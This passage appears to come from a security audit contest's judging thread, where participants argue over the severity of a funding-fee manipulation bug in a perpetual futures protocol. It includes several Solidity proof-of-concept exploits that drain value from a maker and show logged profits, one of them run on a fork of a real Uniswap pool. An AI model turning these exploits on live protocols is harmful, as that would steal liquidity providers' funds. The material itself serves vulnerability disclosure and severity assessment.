    //exploiter profit  = $6,098,860 - $5,000,000 = $1,098,860\n    }\n}\n```\n</details>\n\n```text\nLogs:\n  Exploiter Quote balance at Start: 5000000000000\n\n  Funding Fee Rate after short:\n  -4999999999999999\n\n  Exploiter Quote balance at End: 5016509239587\n```\n\n**IllIllI000**\n\nYou deposited $5M and reduced the tick range from 1774440 ticks to only 20 ticks. I don't think that's likely to happen either\n\n**nirohgo**\n\n> @nirohgo I see your points and I'm open to discussing them, but before that I would like to get a small clarification from your side. In issue #116 you say that setting \"the OM max spread to a larger value than the price band setting\", i.e. admin setting the values that open a window for the vulnerability is an admin error. But in that case admin setting the values that open a window for the vulnerability is not an admin error. I understand it's two completely different issues, but I believe in both cases the trusted admin rule should be applied correctly. What do you think about it?\n\n@WangSecurity  #116 depends on admins setting a specific boundary (max OM spread) to a value higher then the overriding general boundary (price band). This is a clear admin error even without the finding or liquidations (whenever the OM price exceeds the price band transactions will fail). In this case there is no logical error is setting the exponent config to a specific value, the exponent needs to create a curve that's efficient enough to incentivize the market to reduce risk. As the team specified during the contest the exact value is unknown (the best initial guess was the test value).  \n\n**WangSecurity**\n\nFirst, the attack depends on the actions of a TRUSTED admin (setting funding exponent). Other external factors, like the liquidity and ticks, are also required for a successful attack. That's why I believe Medium is appropriate for this report.\n\nPlanning to reject the escalation and leave the issue as it is.\n\n**gstoyanovbg**\n\n1. The exploiter can deposit the necessary liquidity at a specific small price range in the pool in order to not trigger significant slippage ? \n2. The exploiter can just choose such a position size so that the slippage is minimal (just need to observe what is the available liquidity at specific price range)? \n\nThese are not external factors because the attacker can control them. Do you agree that 1) and 2) are possible ? If so this would mean that the attack doesn't depend on trusted admin action because the attack would be profitable for all 1.0e18, 1.1e18, 1.2e18 and 1.3e18.\n\n**IllIllI000**\n\ndepositing liquidity and having yourself trade against it, without you also pushing the price back in your favor before withdrawing it, will result in impermanent loss, which is a cost that you yourself will have to pay back\n\n**gstoyanovbg**\n\nThe exploiter would deposit within the current price range, which already has significant liquidity. Therefore, the deposit wouldn't be as large. The exploiter wouldn't withdraw immediately after the attack but would wait a sufficient amount of time before doing so in order to recover the losses. Even if the profit and losses from the attack are equal for the attacker, it still results in a loss for the maker and is thus a valid attack with no additional constraints. Please correct me if I am wrong.\n\nAlso what do you think about 2) ? \n\n\n**IllIllI000**\n\nAssumes the price will move back in your favor, and that someone 'pays you back' for the amount you pushed it. For 2, you'd have to show a valid poc, and I suspect that nirohgo didn't go along with your [initial](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2074641984) suggestion, because there's some confounding factor.\n\n**IllIllI000**\n\nIf you're planning on providing a poc, please make sure it works will all values that the admin can set, so we can avoid extra endless discussions about whether the value is valid or not\n\n**gstoyanovbg**\n\n@IllIllI000 I can prepare a new POC if it is needed but should know what more is expected from the new POC. In my previous POC, I showed that the attack is profitable even if the exponent is 1.0e18. The same POC works for 1.1e18, 1.2e18 as well. Your consideration was that the range is too small for such large liquidity but this was just for simplicity. If you look into the test pool, you will see that the initial liquidity is only 100 base tokens and 2,000,000 collateral tokens for the range [-887,220, 887,220]. For comparison, in the USDC/ETH pool on Uniswap, there is >200 million TVL and at each of the ticks around the active one, there are around 300,000 liquidity. Should I simulate something like this?\n\n>Assumes the price will move back in your favor, and that someone 'pays you back' for the amount you pushed it. For 2, you'd have to show a valid poc, and I suspect that nirohgo didn't go along with your https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2074641984 suggestion, because there's some confounding factor.\n\nI think that the market will restore the real price in the pool. Moreover the fees will also help to recover the losses. I already mentioned that the important thing here is to have losses for the maker in order to have an attack. Equal losses/profits for the attacker or even a small loss is not a problem. However i believe that the attack is profitable for the exploiter too.\n\n If nirohgo thinks that the adjustment that i made to the POC is not correct is free to comment.\n\n@WangSecurity What do you think ?\n\n**IllIllI000**\n\nHi @gstoyanovbg if you look through the escalations that I have commented on, you'll see that I've spent many hours countering claims, over multiple days, for uncertain benefit. I hope you'll understand if I don't continue this here by thinking of all the possible scenarios, and laying out a poc framework for you, solely for my detriment. What I'll say about your specific point is that nirohgo's POC used a wide tick range in order to simulate a normal market, where the attacker didn't have to introduce special externalities in order to use the uniswap pool. By adding extra liquidity and a specific tick range, you _are_ adding an externality that has to be accounted for. You need to not do that. I believe you'd need to show that the admin parameters have zero effect on whether or not a profit can be made, over normal uniswap/market scenarios that happen very frequently in order for this to become a high.\n\n**gstoyanovbg**\n\nI don't think that the range from the nirohgo's POC is a good example for a normal Uniswap V3 pool. The main idea of Uniswap V3 is to concentrate liquidity in a specific range. Logically, the primary available liquidity is concentrated around the current price. To avoid making unfounded claims, I will use the USDC/ETH (0.05) pool on Uniswap V3 as an example which has 200m TVL. \n![Screenshot from 2024-04-25 02-23-42](https://github.com/sherlock-audit/2024-02-perpetual-judging/assets/57452234/5237c860-a77f-4349-899a-3f9ae0b548f0)\n\nFrom the graph, you can see how liquidity is distributed, with it being insignificant at the left end - around 30k per tick. The range of prices is [2565, 3827]. The price at the moment is 3133. The percentage difference between the current price and that at the left end of the range is about 22%. Similarly for the right boundary, the percentage is the same. I attempted to simulate something like this in the new POC. The numbers are as follows:\n\n- the tick for the current price is -6932.\n- the first range where most of the liquidity is concentrated is 1000 units wide in both directions [-7940; -5940], for which I've provided - 60m USDC + 30k ETH. About 300k for every 10 units. Percentage-wise, a 10% price difference up and down.\n- Then there are another 1000 units in each direction for which I've provided 100k liquidity for every 10 units of tick displacement.\n\nIn my opinion, this scenario is realistic enough, even more unfavorable than reality due to the even distribution of liquidity. The results are as follows:\n\n1.0e18:\n\n```text\nExploiter Quote balance at Start: 5000000000000\nFunding Fee Rate after short: -4999999999999999\nExploiter Quote balance at End: 5013664397043\n```\n\n1.1e18\n\n```text\nExploiter Quote balance at Start: 5000000000000\nFunding Fee Rate after short: -21334035032232417\nExploiter Quote balance at End: 5078754700088\n```\n\n1.2e18\n```text\nExploiter Quote balance at Start: 5000000000000\nFunding Fee Rate after short: -91028210151304013\nExploiter Quote balance at End: 5356482461172\n```\n\n<details>\n<summary>POC</summary>\n\n```solidity\n\ncontract FundingFeeExploit is SpotHedgeBaseMakerForkSetup {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"Taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        //create oracle maker\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n\n        //PARAMETERS SETUP\n\n        //fee setup\n        //funding fee configs (taken from team tests) \n        config.setFundingConfig(marketId, 0.005e18, 1.0e18, address(oracle_maker));\n        //borrowing fee 0.00000001 per second as in team tests\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        \n\n        //whitelist users\n        oracle_maker.setValidSender(exploiter,true);\n        oracle_maker.setValidSender(taker,true);\n        \n        //add more liquidity ($20M) to uniswap pool to simulate realistic slippage\n        deal(address(baseToken), spotLp, 45000e9, true);\n        deal(address(collateralToken), spotLp, 90000000e6, true);\n\n        vm.startPrank(spotLp);\n   \n        uniswapV3NonfungiblePositionManager.mint(\n            INonfungiblePositionManager.MintParams({\n                token0: address(collateralToken),\n                token1: address(baseToken),\n                fee: 500,\n                tickLower: -7940,\n                tickUpper: -5940,\n                amount0Desired: 60000000e6,\n                amount1Desired: 30000e9,\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: spotLp,\n                deadline: block.timestamp\n            })\n        );\n\n        uniswapV3NonfungiblePositionManager.mint(\n            INonfungiblePositionManager.MintParams({\n                token0: address(collateralToken),\n                token1: address(baseToken),\n                fee: 500,\n                tickLower: -8940,\n                tickUpper: -7940,\n                amount0Desired: 1000000e6,\n                amount1Desired: 500e9,\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: spotLp,\n                deadline: block.timestamp\n            })\n        );\n\n        uniswapV3NonfungiblePositionManager.mint(\n            INonfungiblePositionManager.MintParams({\n                token0: address(collateralToken),\n                token1: address(baseToken),\n                fee: 500,\n                tickLower: -5940,\n                tickUpper: -4940,\n                amount0Desired: 1000000e6,\n                amount1Desired: 500e9,\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: spotLp,\n                deadline: block.timestamp\n            })\n        );\n\n        //(,  int24 tick, , , , , ) = IUniswapV3PoolState(uniswapV3SpotPool).slot0();\n        //console.logInt(tick);\n\n        //mock the pyth price to be same as uniswap (set to ~$2000 in base class)\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n\n    function testFundingFeePOC2() public {\n       \n\n        //deposit 5M collateral as margin for exploiter (also mints the amount)\n        uint256 startQuote = 5000000*1e6;\n       _deposit(marketId, exploiter, startQuote);\n       console.log(\"Exploiter Quote balance at Start: %s\\n\", startQuote);\n\n        //deposit to makers\n        //initial HSBM maker deposit: 2000 base tokens ($4M)\n       vm.startPrank(makerLp);\n       deal(address(baseToken), makerLp, 2000*1e9, true);\n       baseToken.approve(address(maker), type(uint256).max);\n       maker.deposit(2000*1e9);\n\n       //initial oracle maker deposit: $2M (1000 base tokens)\n       deal(address(collateralToken), makerLp, 2000000*1e6, true); \n       collateralToken.approve(address(oracle_maker), type(uint256).max);\n       oracle_maker.deposit(2000000*1e6);\n       vm.stopPrank();\n\n       //Also deposit collateral directly to SHBM to simulate some existing margin on the SHBM from previous activity\n       _deposit(marketId, address(maker), 2000000*1e6);\n\n        \n        \n\n       //Exploiter opens the maximum possible (-1000 base tokens) long on oracle maker\n        vm.startPrank(exploiter);\n        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1000*1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n\n        //Exploiter opens maximum possible short on the HSBM maker changing their position to short 1000 (2000-1000)\n        (posBase,openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 2000 * 1e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        console.log(\"Funding Fee Rate after short:\");\n        int256 ffeeRate = fundingFee.getCurrentFundingRate(marketId);\n        console.logInt(ffeeRate);\n        //OUTPUT:\n        // Funding Fee Rate after short:\n        //-388399804857866884\n\n        //move to next block\n        vm.warp(block.timestamp + 2 seconds);\n\n        //Exploiter closes the short to realize gains\n        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: exploiterPosSize.abs(),\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        \n\n        //exploiter withdraws entirely\n        int256 upDec = vault.getUnsettledPnl(marketId,address(exploiter));\n        int256 stDec = vault.getSettledMargin(marketId,address(exploiter));\n        int256 marg = stDec-upDec;\n        uint256 margAbs = marg.abs();\n        uint256 toWithdraw = margAbs.formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n        vault.transferMarginToFund(marketId,toWithdraw);\n        vault.withdraw(vault.getFund(exploiter));\n        vm.stopPrank();\n\n        uint256 finalQuoteBalance = collateralToken.balanceOf(address(exploiter));\n        console.log(\"Exploiter Quote balance at End: %s\", finalQuoteBalance);\n        //OUTPUT: Exploiter Quote balance at End: 6098860645835\n        //exploiter profit  = $6,098,860 - $5,000,000 = $1,098,860\n    }\n}\n```\n</details>\n\n**IllIllI000**\n\nI'm not a uniswap expert. Please do the actual add/remove liquidity in the POC, including it in the start/end balance (both tokens). Also, I didn't check, but I don't think 1e18 is the lower bound of the possible admin-set values\n\n**joicygiore**\n\nBut we also don’t know what the project side’s psychological upper limit is for this value.\n\n**gstoyanovbg**\n\n@IllIllI000 I don't understand what changes you want to make to this POC and how they will contribute to the discussion, so I'll wait to hear the judge's opinion (@WangSecurity ) before making another POC. I hope you understand that if every participant in this discussion requests a custom POC for their own reasons, I'll have to build POCs for this discussion full-time.  That's why I prefer to wait a bit and see if anyone else has any other comments.\n\nRegarding the lower bound of the exponent, the administrator can set it to be 0 or a value close to zero. If we assume that this is an argument, then this discussion could have ended on the third comment and not waste our time. But I believe that here we evaluate realistic values ​​for the exponent, and the sponsor clearly stated in their comment that the value will be 1.0. The whole argumentation so far has been built on the fact that nirohgo's POC does not show profit for this value. I think I explained in detail where the problem with this POC comes from and that if a more realistic simulation is done, there is profit.\n\n**WangSecurity**\n\nFirstly, thanks to all the Watsons providing endless value on this escalation.\n\nSecondly, @gstoyanovbg as I understand, in your scenario, laid out in the last comments, the attack deviates from the original @nirohgo PoC.\n1. In your scenario the attacker themselves deposit liquidity into the pool at a specific price range, correct? This leads to attack not being profitable in the two blocks as in the original attacks by Nirohgo.\n\nIf that's correct, then I see two different scenarios. Let's start with the original scenario. \nThere are several values that effect the attack: funding exponent (set by admins), liquidity and price range.\n2. What are other factors that have effect on the profits for the attack?\n\nAgain thanks to @IllIllI000 @gstoyanovbg and @nirohgo for providing a lot of value here.\n\n**gstoyanovbg**\n\n@WangSecurity The profitability of the attack from the POC of nirohgo depends on the funding exponent and the available liquidity in the respective price range. If a too large position is opened, but there is not enough liquidity in the corresponding price range, part of the value is lost due to excessive slippage. My initial idea was that the attacker could add liquidity where it is lacking in order to extract value from the maker. Or simply calculate the position size to be proportional to the available liquidity so that there is not a large slippage. However, when I started to build the POC, I noticed that in the USDC/ETH pool on Uniswap V3 there is enough liquidity so that nirohgo's original POC is profitable for funding exponent values >= 1.0e18. Therefore, in my latest POC, I decided to simply mimic a pool with liquidity similar to that in USDC/ETH to prove my claim. I still believe that the attacker can add liquidity if necessary and that it can be profitable, it just turned out that it was not necessary in this case.\n\nTo summarize, in my opinion, the exploiter can extract value from the maker for any realistic value of the funding exponent, i.e., >=1.0e18. In most cases, I expect the available liquidity in Uniswap to be sufficient; if not, the attack can be modified to add additional liquidity from the attacker. Earlier in the discussion, we discussed how to proceed in this scenario. I have not analyzed values of the funding exponent < 1.0e18, but I expect that for small values of the funding exponent, the attack will not be profitable. However, I do not think such values represent a realistic scenario. The sponsor has already clearly stated that they intend to use a value of 1.0e18 for the funding exponent. In the tests, the value was 1.3e18. It is also debatable whether there is a theoretical sense in low values of the funding exponent because the incentive for users would be too small\n\n**WangSecurity**\n\nSince the attack can be executed on any funding exponent value discussed above (1.0e18 - 1.3e18), then the liquidity at specific price range is a bigger constraint on the attack profit. But it can be controlled by the attacker as they themselves can add liquidity at a specific price, correct? @gstoyanovbg \n\n**gstoyanovbg**\n\n@WangSecurity Correct.\n\n**WangSecurity**\n\nFirst, the attack can be executed independently on the funding exponent set by the admin (assuming they values are realistic). Even though the possibility and profitable depend on certain liquidity conditions. I believe these conditions are very realistic to occur.\nHence, **high severity is appropriate** here:\n\n> Definite loss of funds without (extensive) limitations of external conditions\n\n**Planning to accept the escalation and upgrade severity to High**\n\n**IllIllI000**\n\nFor full transparency: https://discord.com/channels/812037309376495636/1013592891773419520/1234858790516690966\n\n**IllIllI000**\n\n@gstoyanovbg your PoC relies on a lot more liquidity than there currently is, and therefore your PoC needs to model the costs of adding and removing the liquidity:\n```\nhttps://info.uniswap.org/#/optimism/pools/0x1fb3cf6e48f1e7b10213e7b6d87d4c073c7fdb7b\n\n[...] isn't USDC/ETH pool TVL on Optimism just 4M?\n```\nhttps://discord.com/channels/812037309376495636/1013592891773419520/1234878162697977986\n\nFurther, if you're adding liquidity for two blocks, you can't use a [flash loan](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133#issuecomment-2080149086) and you're at risk of the price moving, or someone taking your liquidity, so I don't think this can be High at the moment.\nFor your argument that you can still attack but smaller amounts with the given liquidity, can you quantify how much an attack can gain given the 4M liquidity is spread over the whole pool, not just the current price, and show that the attacker can gain more than dust amounts with the 1e18 value?\n\n**gstoyanovbg**\n\n@IllIllI000 First, thanks to you and your lawyers for noticing that the TVL of the mentioned pool is 4M on Optimism. The graph I attached is from the same pool but on Ethereum. It has been a while since the end of the contest, and at that moment, I did not realize that Ethereum is not on the list of supported chains. I apologize for the mistake.\n\nHowever, I don't think there is a significant difference, and I will soon upload a new POC to clear up any doubts.\n\n**neko-nyaa**\n\nAs the mentioned \"lawyer\", having read the discussion and I really don't understand where we are even trying to head towards. \n\nLet's first be clear here that I don't care about any bounties, and any \"lawyers\" who are aiming for the bounty can try and push this issue to their favored direction. The only direction I am respecting is where the truth is headed, hence this analysis.\n\nWhat is clear from just the issue, and has been reiterated/implied multiple times throughout the discussion, is that the \"attack\" is possible regardless. From the formula, it is clear that the funding rate is proportional to the OM's open notional, which is exactly what this attack is trying to achieve.\n\nThen the profitability depends on multiple factors:\n- Admin's setting for funding rate. Affects profitability for setting the fee speed.\n- OM's TVL. From formula, higher open notional == higher funding rate.\n- Attacker's available margin, relative to OM's TVL.\n- UniV3's TVL. Affects profitability for price impact during the swap.\n- Price movements between the two steps (opening on OM and closing on SHBM).\n\nThen the questions to be analyzed here are:\n- What counts as a realistic TVL for the OM?\n- The lower the OM's TVL, the easier the attack (low slippage loss), but the less impactful it is. However the higher the OM's TVL, the harder the attack (high slippage loss), but the more impactful it is. Where is the profit extremum point? Is it realistic, and how profitable is the attack for a range of TVLs around that extremum?\n- Can these factors be considered extensive?\n\nNow, is this big picture big enough to look at? Have we narrowed it down enough for a numerical analysis?\n\nEdit: Re-analyzed the formula and it looks like non-basepool traders do not have a dampening effect. So that's one thing out of the way.\n\nI'll make just this comment and not engage in this discussion.\n\n**WangSecurity**\n\n@gstoyanovbg wanted to ask how's the PoC going and how much time approximately you need?\n\n**gstoyanovbg**\n\n@WangSecurity Tomorrow will post it. Sorry for the delay i was very busy last couple of days.\n\n**gstoyanovbg**\n\n@WangSecurity I'm ready with the new POC, and it includes several improvements compared to the previous ones. To avoid doubts about the way I simulate the Uniswap pool, I changed the contracts to use the actual Uniswap V3 WETH/USDC 0.05% pool on Optimism via a fork from a specific block. The block is a random block from yesterday. I've prepared 2 tests. In one, only the available liquidity in the pool is used, and in the other, I show how adding additional liquidity can increase profits without any losses. I also noticed another mistake in the previous POCs - when positions are closed and the amount is withdrawn, it turns out that there isn't always enough collateral to withdraw the entire profit. In the current POC, I corrected this by simulating a loss from another trader so that the entire profit can be withdrawn. The changes span across several files, and I'm attaching all of them. If anyone encounters issues with running this, they can contact me.\n\n<details>\n<summary>POC</summary>\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../spotHedgeMaker/SpotHedgeBaseMakerForkSetup2.sol\";\nimport { OracleMaker } from \"../../src/maker/OracleMaker.sol\";\nimport \"../../src/common/LibFormatter.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\n\ninterface IUniswapV3PoolState {\n    /// @notice The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas\n    /// when accessed externally.\n    /// @return sqrtPriceX96 The current price of the pool as a sqrt(token1/token0) Q64.96 value\n    /// tick The current tick of the pool, i.e. according to the last tick transition that was run.\n    /// This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick\n    /// boundary.\n    /// observationIndex The index of the last oracle observation that was written,\n    /// observationCardinality The current maximum number of observations stored in the pool,\n    /// observationCardinalityNext The next maximum number of observations, to be updated when the observation.\n    /// feeProtocol The protocol fee for both tokens of the pool.\n    /// Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0\n    /// is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee.\n    /// unlocked Whether the pool is currently locked to reentrancy\n    function slot0()\n        external\n        view\n        returns (\n            uint160 sqrtPriceX96,\n            int24 tick,\n            uint16 observationIndex,\n            uint16 observationCardinality,\n            uint16 observationCardinalityNext,\n            uint8 feeProtocol,\n            bool unlocked\n        );\n\n    /// @notice The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\n    /// @dev This value can overflow the uint256\n    function feeGrowthGlobal0X128() external view returns (uint256);\n\n    /// @notice The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\n    /// @dev This value can overflow the uint256\n    function feeGrowthGlobal1X128() external view returns (uint256);\n\n    /// @notice The amounts of token0 and token1 that are owed to the protocol\n    /// @dev Protocol fees will never exceed uint128 max in either token\n    function protocolFees() external view returns (uint128 token0, uint128 token1);\n\n    /// @notice The currently in range liquidity available to the pool\n    /// @dev This value has no relationship to the total liquidity across all ticks\n    function liquidity() external view returns (uint128);\n\n    /// @notice Look up information about a specific tick in the pool\n    /// @param tick The tick to look up\n    /// @return liquidityGross the total amount of position liquidity that uses the pool either as tick lower or\n    /// tick upper,\n    /// liquidityNet how much liquidity changes when the pool price crosses the tick,\n    /// feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0,\n    /// feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1,\n    /// tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick\n    /// secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick,\n    /// secondsOutside the seconds spent on the other side of the tick from the current tick,\n    /// initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false.\n    /// Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0.\n    /// In addition, these values are only relative and must be used only in comparison to previous snapshots for\n    /// a specific position.\n    function ticks(int24 tick)\n        external\n        view\n        returns (\n            uint128 liquidityGross,\n            int128 liquidityNet,\n            uint256 feeGrowthOutside0X128,\n            uint256 feeGrowthOutside1X128,\n            int56 tickCumulativeOutside,\n            uint160 secondsPerLiquidityOutsideX128,\n            uint32 secondsOutside,\n            bool initialized\n        );\n\n    /// @notice Returns 256 packed tick initialized boolean values. See TickBitmap for more information\n    function tickBitmap(int16 wordPosition) external view returns (uint256);\n\n    /// @notice Returns the information about a position by the position's key\n    /// @param key The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\n    /// @return _liquidity The amount of liquidity in the position,\n    /// Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke,\n    /// Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke,\n    /// Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke,\n    /// Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\n    function positions(bytes32 key)\n        external\n        view\n        returns (\n            uint128 _liquidity,\n            uint256 feeGrowthInside0LastX128,\n            uint256 feeGrowthInside1LastX128,\n            uint128 tokensOwed0,\n            uint128 tokensOwed1\n        );\n\n    /// @notice Returns data about a specific observation index\n    /// @param index The element of the observations array to fetch\n    /// @dev You most likely want to use #observe() instead of this method to get an observation as of some amount of time\n    /// ago, rather than at a specific index in the array.\n    /// @return blockTimestamp The timestamp of the observation,\n    /// Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp,\n    /// Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp,\n    /// Returns initialized whether the observation has been initialized and the values are safe to use\n    function observations(uint256 index)\n        external\n        view\n        returns (\n            uint32 blockTimestamp,\n            int56 tickCumulative,\n            uint160 secondsPerLiquidityCumulativeX128,\n            bool initialized\n        );\n}\n\ncontract FundingFeeExploit3 is SpotHedgeBaseMakerForkSetup2 {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"Taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    address public trader = makeAddr(\"Trader\");\n    \n    OracleMaker public oracle_maker;\n\n    uint256 uniPositionId;\n\n    function setUp() public override {\n        super.setUp();\n\n        //create oracle maker\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n\n        config.setFundingConfig(marketId, 0.005e18, 1.0e18, address(oracle_maker));\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        \n        //whitelist users\n        oracle_maker.setValidSender(exploiter,true);\n        oracle_maker.setValidSender(taker,true);\n        oracle_maker.setValidSender(trader,true);\n       \n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(3000,0);\n    }\n\n    function openUniswapV3Position(address user, uint256 amount) public returns (uint256)\n    {\n        vm.startPrank(user);\n\n        baseToken2.approve(address(uniswapV3NonfungiblePositionManager), type(uint256).max);\n        collateralToken.approve(address(uniswapV3NonfungiblePositionManager), type(uint256).max);\n\n        (uniPositionId,,,) = uniswapV3NonfungiblePositionManager.mint(\n            INonfungiblePositionManager.MintParams({\n                token0: address(baseToken2),\n                token1: address(collateralToken),\n                fee: 500,\n                tickLower: -196270,\n                tickUpper: -196260,\n                amount0Desired: 0,\n                amount1Desired: amount,\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: user,\n                deadline: block.timestamp\n            })\n        );\n\n        return uniPositionId;\n    }\n\n    function closeUniswapV3Position(uint256 uniPositionId, address user) public\n    {\n        uint256 startBalance = collateralToken.balanceOf(user);\n        console.log(\"Balance of LP before UNI V3 position burn: %d\", startBalance);\n        vm.startPrank(user);\n        INonfungiblePositionManager.CollectParams memory params =\n            INonfungiblePositionManager.CollectParams({\n                tokenId: uniPositionId,\n                recipient: address(user),\n                amount0Max: type(uint128).max,\n                amount1Max: type(uint128).max\n            });\n\n        {\n            uniswapV3NonfungiblePositionManager.collect(params);\n            \n            (, , address token0, address token1, , , , uint128 liquidity, , , uint128 tokenowed0 , uint128 tokenowed1 ) = uniswapV3NonfungiblePositionManager.positions(uniPositionId);\n\n            INonfungiblePositionManager.DecreaseLiquidityParams memory params2 =\n            INonfungiblePositionManager.DecreaseLiquidityParams({\n                tokenId: uniPositionId,\n                liquidity: liquidity,\n                amount0Min: 0,\n                amount1Min: 0,\n                deadline: block.timestamp\n            });\n\n            uniswapV3NonfungiblePositionManager.decreaseLiquidity(params2);\n\n            (, ,  token0,  token1, , , ,  liquidity, , ,  tokenowed0 ,  tokenowed1 ) = uniswapV3NonfungiblePositionManager.positions(uniPositionId);\n\n            uniswapV3NonfungiblePositionManager.collect(params);\n\n            uniswapV3NonfungiblePositionManager.burn(uniPositionId);\n            uint256 endBalance = collateralToken.balanceOf(user);\n            console.log(\"Balance of LP after UNI V3 position burn: %d\", endBalance);\n            uint256 difference = endBalance - startBalance;\n            console.log(\"The amount received after burn of the UNI V3 position is %d\", difference);\n        }\n    }\n\n    function testFundingFeeExploitNoAdditionalLiquidity() public\n    {\n        //deposit 6M collateral as margin for exploiter (also mints the amount)\n        uint256 startQuote = 6000000*1e6;\n        _deposit(marketId, exploiter, startQuote);\n        _deposit(marketId, trader, 30000000e6);  \n\n        console.log(\"Exploiter Quote balance at Start: %s\\n\", startQuote);\n\n        //deposit to makers\n        //initial HSBM maker deposit: 2000 base tokens ($6M)\n        vm.startPrank(makerLp);\n        deal(address(baseToken2), makerLp, 2000*1e18, false);\n        baseToken2.approve(address(maker), type(uint256).max);\n        maker.deposit(2000*1e18);\n\n        //initial oracle maker deposit: $3M (1000 base tokens)\n        deal(address(collateralToken), makerLp, 3000000*1e6, false); \n        collateralToken.approve(address(oracle_maker), type(uint256).max);\n        oracle_maker.deposit(3000000*1e6);\n        vm.stopPrank();\n\n        //Also deposit collateral directly to SHBM to simulate some existing margin on the SHBM from previous activity\n        _deposit(marketId, address(maker), 3000000*1e6);\n\n        //Exploiter opens the maximum possible (-1000 base tokens) long on oracle maker\n        vm.startPrank(exploiter);\n        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1000*1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        (posBase,openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 2000 * 1e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        console.log(\"Funding Fee Rate after short:\");\n        int256 ffeeRate = fundingFee.getCurrentFundingRate(marketId);\n        console.logInt(ffeeRate);\n\n        //move to next block\n        vm.warp(block.timestamp + 2 seconds);\n\n        //Exploiter closes the short to realize gains\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 2000 * 1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        //Exploiter closes the long position\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: 